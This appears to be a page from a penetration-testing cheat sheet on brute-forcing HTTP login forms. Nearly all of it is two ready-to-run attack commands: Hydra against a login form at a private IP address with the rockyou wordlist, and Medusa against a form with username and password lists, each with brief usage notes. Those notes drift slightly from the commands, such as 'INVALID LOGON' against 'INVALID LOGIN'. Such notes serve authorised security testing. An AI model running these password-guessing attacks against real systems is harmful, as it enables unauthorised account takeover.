---
title: HTTP Form POST
parent: Web
layout: default
nav_order: 1
---

1. Hydra:\
   `hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/seclists/rockyou.txt -vV -f`
   (change the user and pass parameter where appropriate. INVALID LOGON is the error message after incorrect password)
2. Medusa:\
   `medusa -h example.com -U usernames.txt -P passwords.txt -M http -m FORM:/login.php:username_field=password_field -t 5`\
   (Suitable for form login. Replace -u with -U if have wordlist. dir with the directory path to crack.)